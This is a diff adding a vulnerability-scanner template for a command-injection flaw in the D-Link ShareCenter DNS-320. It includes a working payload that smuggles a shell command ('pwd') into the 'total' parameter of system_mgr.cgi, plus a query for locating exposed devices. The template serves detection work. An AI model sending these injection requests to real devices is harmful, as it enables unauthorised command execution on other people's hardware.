@@ -1,0 +1,16 @@
+name: D-Link ShareCenter DNS-320 RCE
+manual: true
+query: app="D_Link-DNS-ShareCenter"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;pwd;
+    expression: response.status == 200 && response.body.bcontains(b"var/www")
+expression: r0()
+detail:
+  description: D-Link is a global leader in designing and developing networking and
+    connectivity products for consumers, small businesses, medium to large-sized enterprises,
+    and service providers.
+  tags: RCE
